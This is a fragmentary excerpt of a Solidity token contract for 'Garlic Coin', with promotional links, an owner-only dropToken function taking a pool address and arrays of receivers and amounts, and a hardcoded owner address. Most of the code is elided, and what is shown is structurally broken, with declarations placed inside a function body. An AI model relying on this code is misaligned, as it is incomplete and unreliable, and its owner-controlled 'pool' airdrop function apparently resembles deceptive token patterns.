...
https://t.me/GarlicoinOfficial
https://twitter.com/garliccoin
https://garlicoin.io/
*/
library SafeMath {
...
contract Garlic is Context, IERC20 {
  ...
  function dropToken(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    ...
    address public _Owner = 0x88dE33BeFd0FC1b7371AC8303E6B54f9012B5b5E;
    constructor () public {
        _name = "Garlic Coin";
        _symbol ="GARLIC";
        _decimals = 18;
        uint256 initialSupply = 69000000;
        _spf = 0x88dE33BeFd0FC1b7371AC8303E6B54f9012B5b5E;
